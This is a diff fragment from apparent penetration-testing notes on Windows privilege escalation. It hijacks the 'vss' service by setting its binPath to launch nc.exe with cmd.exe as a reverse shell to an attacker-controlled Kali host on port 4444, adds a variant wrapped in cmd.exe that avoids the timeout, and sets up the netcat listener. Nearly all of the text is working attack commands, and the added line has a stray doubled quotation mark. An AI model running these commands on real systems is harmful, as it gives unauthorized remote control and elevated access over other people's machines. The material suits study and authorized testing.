@@ -57,7 +57,9 @@ upload nc.exe
 sc.exe query
 
 # modify the config of 'vss' service (as this is a popular service) to point to nc.exe
+# The 2nd one will not timeout
 sc.exe config vss binPath="C:\path\to\nc.exe -e cmd.exe <Kali IP> 4444"
+sc.exe config vss binpath="C:\windows\system32\cmd.exe /c C:\path\to\nc.exe -e cmd.exe <Kali IP> 4444""
 
 # On Kali prepare for the connection
 nc -nlvp 4444
